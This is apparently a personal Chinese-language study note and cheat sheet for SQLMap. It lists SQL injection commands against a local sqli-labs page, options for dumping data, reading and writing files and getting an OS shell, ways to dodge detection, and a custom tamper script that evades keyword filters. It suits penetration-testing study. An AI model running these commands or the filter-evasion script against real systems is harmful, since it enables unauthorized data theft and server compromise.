---
title: "SQLMap"
date: 2025-03-16
tags:
  - Others
categories:
  - Others
---
# SQLMap

![[attachments/20250510.png]]

# 常用命令

```bash
# GET

sqlmap -u "http://127.0.0.1/Less-1/" --dbms=MySQL --random-agent --flush-session --technique=U -v 3

# POST

sqlmap -r test.txt

sqlmap -u "http://127.0.0.1/Less-1/" --data="uname=admin&passwd=2333&submit=Submit"

sqlmap -u "http://127.0.0.1/Less-1/" --data="uname=admin&passwd=2333&submit=Submit" -p "uname" --dbms=MySQL --random-agent --flush-session --technique=U -v 3

sqlmap -u "http://127.0.0.1/Less-1/" --cookie="uname=admin" -p "uname" --dbms=MySQL --random-agent --flush-session --technique=U -v 3 --level=2

sqlmap -u "http://127.0.0.1/Less-1/" --cookie="uname=*" --tamper="base64encode" --dbms=MySQL --random-agent --flush-session --technique=U -v 3

# technique U联合注入	E报错注入	B布尔盲注	T延时盲注
# --batch 使用默认的选项（不需要再输入y/n）
```

# 数据猜解-库表列数据&字典

测试：常规数据获取

```shell
--current-db
--tables -D ""
--columns -T "" -D ""
--dump -C "" -T "" -D ""
```

# 权限操作-文件&命令&交互式

测试：高权限操作

```shell
引出权限：
--is-dba 	--privileges

引出文件：
--file-read 	--file-write --file-dest 

引出命令：
--os-cmd=""	 --os-shell 	--sql-shell
```

# 提交方法-POST&HEAD&JSON

测试：Post Cookie Json 等

```shell
--data ""
--cookie ""
-r 1.txt
```

# 绕过模块-Tamper脚本-使用&开发

测试：base64+json 注入&再加有过滤的注入

```shell
--tamper=base64encode.py
--tamper=test.py
```

```python
from lib.core.convert import encodeBase64
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def dependencies():
    pass

def tamper(payload, **kwargs):
    if payload:      
        payload = payload.replace('SELECT','sElEct')
        payload = payload.replace('select','sElEct')
        payload = payload.replace('OR','Or')
        payload = payload.replace('or','Or')
        payload = payload.replace('AND','And')
        payload = payload.replace('and','And')
        payload = payload.replace('XOR','xOr')
        payload = payload.replace('xor','xOr')
        payload = payload.replace('SLEEP','SleeP')
        payload = payload.replace('sleep','SleeP')
        payload = payload.replace('ELT','Elt')
    return encodeBase64(payload, binary=False) if payload else payload
```

# 分析拓展-代理&调试&指纹&风险&等级

- 后期分析调试：

```shell
-v=(0-6)  # 详细的等级(0-6)
--proxy "http://xx:xx" # 代理注入
```

- 打乱默认指纹：

绕过流量设备识别 sqlmap

```shell
--user-agent ""  # 自定义user-agent
--random-agent   # 随机user-agent
--time-sec=(2,5) # 延迟响应，默认为5
```

- 使用更多的测试：测试Header注入

```shell
--level=(1-5) # 要执行的测试水平等级，默认为1 
--risk=(0-3)  # 测试执行的风险等级，默认为1 
```

> 缓存默认在 `C:\Users\用户名\AppData\Local\sqlmap`（Windows）

> https://www.cnblogs.com/bmjoker/p/9326258.html
